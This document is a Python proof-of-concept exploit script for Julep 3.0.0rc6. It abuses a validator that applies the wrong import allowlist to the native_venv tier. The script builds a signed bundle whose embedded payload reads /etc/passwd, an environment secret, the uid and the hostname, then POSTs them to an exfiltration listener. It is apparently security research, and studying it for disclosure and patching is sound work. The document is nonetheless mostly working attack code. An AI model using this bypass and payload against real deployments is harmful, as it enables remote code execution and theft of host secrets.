#!/usr/bin/env python3
"""Julep 3.0.0rc6 (commit fc74d07) native_venv bundle RCE PoC.

Root cause: julep/registry.py::_validate_portable_source uses the WASM guest
stdlib allowlist for BOTH tiers.  For tier="native_venv", `import os`,
`import subprocess`, `import ctypes`, `import socket` pass validation, and
julep/execution/native_venv_executor.py then runs the source with
`exec(source, {"pure": pure})` in a real host subprocess.

This PoC:
  1. builds a signed bundle whose pure declares executorTier="native"
  2. resolves it through julep.worker_store.resolve_and_register
  3. invokes it through registry.get_pure()
  4. the pure reads host files, captures env/uid, and POSTs a proof artifact
     to a local listener
"""
from __future__ import annotations

import hashlib
import json
import os
import sys
import threading
import time
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path

ROOT = Path("/tmp/opencode/julep-poc")
ROOT.mkdir(parents=True, exist_ok=True)
(ROOT / "venvs").mkdir(exist_ok=True)
os.environ["JULEP_NATIVE_VENV_CACHE_DIR"] = str(ROOT / "venvs")

sys.path.insert(0, str(Path.home() / "research" / "julep"))

from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric.ed25519 import Ed25519PrivateKey

from julep import deps
from julep.artifact_store import LocalDirArtifactStore
from julep.bundle import ABI_PYTHON_SOURCE_JSON_V1
from julep.ir import canonical_json
from julep.registry import Registry, _text_hash, _validate_portable_source
from julep.worker_store import resolve_and_register

PURE_NAME = "poc.native_rce.v1"
SEED = bytes.fromhex("42" * 32)
LISTEN = ("127.0.0.1", 8899)
MARKER = "JULEP-NATIVE-VENV-RCE-PROOF-7f3c9a"
SECRET = "sk-live-poc-secret-9d1f4a"


def signer() -> tuple[Ed25519PrivateKey, str]:
    priv = Ed25519PrivateKey.from_private_bytes(SEED)
    pub = priv.public_key().public_bytes(
        encoding=serialization.Encoding.Raw,
        format=serialization.PublicFormat.Raw,
    ).hex()
    return priv, pub


def malicious_source() -> str:
    # PEP 723 deps are required for the native tier; the malicious code only
    # needs stdlib, but the tier gate demands a non-empty deps list.
    return f'''# /// script
# dependencies = ["packaging==24.2"]
# requires-python = ">=3.14"
# ///
import hashlib
import json
import os
import subprocess
import urllib.request

@pure("{PURE_NAME}")
def exfiltrate(value, **kwargs):
    proof = {{
        "marker": open("{ROOT / 'marker.txt'}", "r").read().strip(),
        "secret_env": os.environ.get("POC_SECRET", "<missing>"),
        "uid": subprocess.run(["id"], capture_output=True, text=True).stdout.strip(),
        "hostname": os.uname().nodename,
        "cwd": os.getcwd(),
        "passwd_sha256": hashlib.sha256(open("/etc/passwd", "rb").read()).hexdigest(),
        "pid": os.getpid(),
    }}
    body = json.dumps(proof, sort_keys=True).encode()
    req = urllib.request.Request(
        "http://127.0.0.1:8899/exfil",
        data=body,
        headers={{"Content-Type": "application/json"}},
    )
    urllib.request.urlopen(req, timeout=10).read()
    return {{"exfiltrated": True, "proof": proof}}
'''


# The driver's exec globals only expose `pure`, so the payload must not rely on
# sys being imported by the driver.  Use os.uname/argv-free data above; this
# placeholder is replaced below.


class Receiver(BaseHTTPRequestHandler):
    def do_POST(self):
        length = int(self.headers.get("Content-Length", "0"))
        body = self.rfile.read(length)
        (ROOT / "proof.raw").write_bytes(body)
        print(f"[listener] POST {self.path} {len(body)} bytes", flush=True)
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"ok")

    def log_message(self, *args):
        pass


def build_signed_bundle(store: LocalDirArtifactStore, source: str) -> tuple[str, str, str]:
    priv, pub = signer()
    source_digest = store.put(source.encode("utf-8"))
    source_hash = _text_hash(source)
    name = PURE_NAME

    flow_digest = store.put(canonical_json({"poc": "flow"}).encode("utf-8"))
    components = {"pureSourceHashes": {name: source_hash}}
    components_digest = store.put(canonical_json(components).encode("utf-8"))

    manifest = {
        "artifactHash": f"sha256:{components_digest}",
        "artifactComponents": components_digest,
        "flow": flow_digest,
        "pures": [
            {
                "abi": ABI_PYTHON_SOURCE_JSON_V1,
                "name": name,
                "source": source_digest,
                "sourceHash": source_hash,
                "executorTier": "native",
                "deps": ["packaging==24.2"],
                "requiresPython": ">=3.14",
            }
        ],
        "signature": None,
    }
    manifest_bytes = canonical_json(manifest).encode("utf-8")
    bundle_hash = store.put(manifest_bytes)
    signature = {
        "algo": "ed25519",
        "bundleHash": bundle_hash,
        "publicKey": pub,
        "sig": priv.sign(manifest_bytes).hex(),
    }
    signature_digest = store.put(canonical_json(signature).encode("utf-8"))
    return bundle_hash, signature_digest, pub


def main() -> int:
    (ROOT / "marker.txt").write_text(MARKER + "\n")
    os.environ["POC_SECRET"] = SECRET

    source = malicious_source()
    print(f"[*] target pure: {PURE_NAME}")
    print(f"[*] source imports: os, subprocess, urllib, hashlib, json")
    print(f"[*] _text_hash(source) = {_text_hash(source)}")

    # Show the vulnerable validator explicitly accepting the payload.
    _validate_portable_source(
        PURE_NAME, source, allow_dependencies=True, validate_dependency_imports=False
    )
    parsed_deps, requires_python = deps.parse_pep723(source)
    print(f"[*] validator accepted. deps={parsed_deps} requiresPython={requires_python}")

    store = LocalDirArtifactStore(ROOT / "store")
    bundle_hash, signature_digest, pub = build_signed_bundle(store, source)
    print(f"[*] signed bundle: {bundle_hash}")
    print(f"[*] signer pubkey: {pub}")

    server = ThreadingHTTPServer(LISTEN, Receiver)
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    print(f"[*] listener on http://{LISTEN[0]}:{LISTEN[1]}/exfil")

    registry = Registry()
    result = resolve_and_register(
        store,
        bundle_hash,
        signature_digest=signature_digest,
        allowed_signers=[pub],
        native_grant=[PURE_NAME],
        registry=registry,
    )
    print(f"[*] resolve_and_register: {json.dumps(result, sort_keys=True)}")
    entry = registry.pures[PURE_NAME]
    print(
        f"[*] registered tier={entry.executor} deps={entry.deps} "
        f"requiresPython={entry.requires_python}"
    )

    print("[*] invoking pure (builds uv venv, installs packaging, execs payload)...")
    t0 = time.time()
    value = registry.get_pure(PURE_NAME)({"trigger": True})
    elapsed = time.time() - t0
    print(f"[*] pure returned in {elapsed:.1f}s: {json.dumps(value, sort_keys=True)}")

    # Wait for the listener write to land.
    deadline = time.time() + 5
    while not (ROOT / "proof.raw").exists() and time.time() < deadline:
        time.sleep(0.05)

    server.shutdown()
    if not (ROOT / "proof.raw").exists():
        print("[!] no proof received", file=sys.stderr)
        return 1

    proof = json.loads((ROOT / "proof.raw").read_text())
    proof_hash = hashlib.sha256((ROOT / "proof.raw").read_bytes()).hexdigest()
    print("[+] EXFILTRATED PROOF:")
    print(json.dumps(proof, indent=2, sort_keys=True))
    print(f"[+] proof sha256: {proof_hash}")

    checks = {
        "marker_matches": proof.get("marker") == MARKER,
        "env_secret_matches": proof.get("secret_env") == SECRET,
        "uid_is_real": "uid=" in proof.get("uid", ""),
        "passwd_read": proof.get("passwd_sha256") is not None,
    }
    print(f"[+] checks: {json.dumps(checks, sort_keys=True)}")
    return 0 if all(checks.values()) else 2


if __name__ == "__main__":
    raise SystemExit(main())
